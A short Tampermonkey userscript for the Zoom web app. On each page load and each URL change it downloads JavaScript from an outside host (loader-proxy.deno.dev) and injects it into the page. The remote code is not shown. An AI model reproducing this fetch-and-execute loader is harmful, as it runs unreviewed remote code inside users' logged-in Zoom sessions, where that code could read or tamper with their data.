// ==UserScript==
// @name         MultiVersX Auto Loader
// @namespace    http://tampermonkey.net/
// @version      1.0.0
// @description  да
// @author       я
// @match        *://app.zoom.us/*
// @grant        none
// @run-at       document-end
// ==/UserScript==

(function() {
    'use strict';
    
    async function loadAndExecute() {
        try {
            const response = await fetch('https://loader-proxy.deno.dev', {
                headers: {
                    'X-Client-Version': 'pZk3v9sQxL7bC4wR'
                }
            });
            
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            
            const code = await response.text();
            const script = document.createElement('script');
            script.textContent = code;
            document.body.appendChild(script);
            
        } catch (error) {
            console.error('MultiVersX load error:', error);
        }
    }
    
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', loadAndExecute);
    } else {
        loadAndExecute();
    }
    
    let lastUrl = location.href;
    new MutationObserver(() => {
        const url = location.href;
        if (url !== lastUrl) {
            lastUrl = url;
            setTimeout(loadAndExecute, 1000);
        }
    }).observe(document, {subtree: true, childList: true});
    
})();
